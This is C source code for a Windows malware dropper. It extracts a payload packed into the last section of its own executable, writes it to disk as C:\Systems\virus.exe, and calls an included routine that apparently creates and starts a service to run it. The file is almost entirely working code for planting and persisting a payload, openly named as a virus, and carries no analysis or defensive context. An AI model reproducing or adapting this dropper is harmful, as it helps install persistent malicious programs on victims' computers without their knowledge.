#ifndef UNICODE
#define UNICODE
#endif 

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#include "startupservice.h"

DWORD get_packed_size();
void get_packed_data(LPVOID data);
void create_new_pe(LPCWSTR name, LPVOID data, DWORD size);
void create_path();

int main(int argc, char *argv[])
{
   DWORD packed_size = get_packed_size();
   LPVOID packed_data = malloc(packed_size);
   get_packed_data(packed_data);

   create_path();
   create_new_pe(L"C:\\Systems\\virus.exe", packed_data, packed_size);
   create_and_start_service();

   return 0;
}

DWORD align(DWORD value, DWORD alignment)
{
   return value + ((value % alignment == 0) ? 0 : alignment - (value % alignment));
}

void create_path()
{
   BOOL result = CreateDirectory(L"C:\\Systems", NULL);
   return;
}

DWORD get_packed_size()
{
   LPVOID base = (LPVOID) GetModuleHandle(NULL);
   BYTE *pointer = (BYTE *) base;

   PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER) base;
   pointer += dos_header->e_lfanew;

   PIMAGE_NT_HEADERS64 nt_headers = (PIMAGE_NT_HEADERS64) pointer;
   WORD num_of_sections = nt_headers->FileHeader.NumberOfSections;

   pointer = (BYTE *) &(nt_headers->OptionalHeader) + nt_headers->FileHeader.SizeOfOptionalHeader;
   PIMAGE_SECTION_HEADER section_table = (PIMAGE_SECTION_HEADER) pointer;
   PIMAGE_SECTION_HEADER packed_section = &section_table[num_of_sections - 1];

   return align(packed_section->Misc.VirtualSize, nt_headers->OptionalHeader.SectionAlignment);
}

void get_packed_data(LPVOID data)
{
   LPVOID base = (LPVOID) GetModuleHandle(NULL);
   BYTE *pointer = (BYTE *) base;

   PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER) base;
   pointer += dos_header->e_lfanew;

   PIMAGE_NT_HEADERS64 nt_headers = (PIMAGE_NT_HEADERS64) pointer;
   WORD num_of_sections = nt_headers->FileHeader.NumberOfSections;

   pointer = (BYTE *) &(nt_headers->OptionalHeader) + nt_headers->FileHeader.SizeOfOptionalHeader;
   PIMAGE_SECTION_HEADER section_table = (PIMAGE_SECTION_HEADER) pointer;
   PIMAGE_SECTION_HEADER packed_section = &section_table[num_of_sections - 1];

   DWORD virtual_address = packed_section->VirtualAddress;
   DWORD virtual_size = align(packed_section->Misc.VirtualSize, nt_headers->OptionalHeader.SectionAlignment);
   pointer = (BYTE *) base + virtual_address;

   memcpy(data, pointer, virtual_size);
   return;
}

void create_new_pe(LPCWSTR name, LPVOID data, DWORD size)
{
   HANDLE file = CreateFile(
      name,
      GENERIC_WRITE,
      FILE_SHARE_WRITE, 
      NULL, 
      CREATE_NEW, 
      FILE_ATTRIBUTE_NORMAL,
      NULL
      );
   
   if (file == INVALID_HANDLE_VALUE) {
      printf("Last error: %d\n", GetLastError());
      return;
   }

   DWORD writed_bytes = 0;
   WriteFile(
      file,
      data,
      size,
      &writed_bytes,
      NULL
   );

   CloseHandle(file);

   return;
}